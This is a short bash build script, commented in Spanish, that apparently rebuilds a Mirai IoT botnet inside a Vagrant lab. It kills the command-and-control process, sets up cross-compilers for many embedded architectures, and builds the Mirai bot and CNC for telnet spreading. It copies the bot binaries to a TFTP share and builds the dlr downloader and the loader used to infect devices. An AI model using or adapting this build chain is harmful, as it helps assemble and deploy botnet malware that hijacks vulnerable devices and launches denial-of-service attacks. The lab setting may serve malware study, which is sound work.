#!/usr/bin/env bash

echo ">>> Recompilando... Cerrando proceso CNC... "
killall cnc || true
export PATH=$PATH:/etc/xcompile/cross-compiler-armv4l/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-armv6l/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-i586/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-m68k/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-mips/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-mipsel/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-powerpc/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-sh4/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-sparc/bin
export PATH=$PATH:/etc/xcompile/cross-compiler-armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin

go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo ">>> Building mirai bot and cnc..."
cd /vagrant/mirai/
./build.sh release telnet
cp /vagrant/mirai/release/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai/dlr
./build.sh
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cd /vagrant/mirai/loader
./build.sh

echo ">>> Terminado, EJECUTA start.bat para volver a iniciar"
